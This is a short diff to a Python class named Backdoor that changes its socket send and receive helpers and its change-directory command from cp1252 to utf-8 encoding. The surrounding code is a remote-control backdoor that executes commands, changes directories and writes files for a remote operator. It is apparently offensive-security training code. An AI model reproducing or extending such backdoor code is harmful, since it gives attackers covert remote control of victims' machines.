@@ -20,11 +20,11 @@ class Backdoor:
             return e.output
 
     def reliable_send(self, data):
-        json_data = json.dumps(data.decode("cp1252"))
-        self.connection.send(bytes(json_data, "cp1252"))
+        json_data = json.dumps(data.decode("utf-8"))
+        self.connection.send(bytes(json_data, "utf-8"))
 
     def reliable_receive(self):
-        json_data = bytes("", "cp1252")
+        json_data = bytes("", "utf-8")
         while True:
             try:
                 json_data += self.connection.recv(1024)
@@ -35,7 +35,7 @@ class Backdoor:
     @staticmethod
     def cd(path):
         os.chdir(path)
-        return bytes("WD -> " + path, "cp1252")
+        return bytes("WD -> " + path, "utf-8")
 
     @staticmethod
     def write_file(path, content):
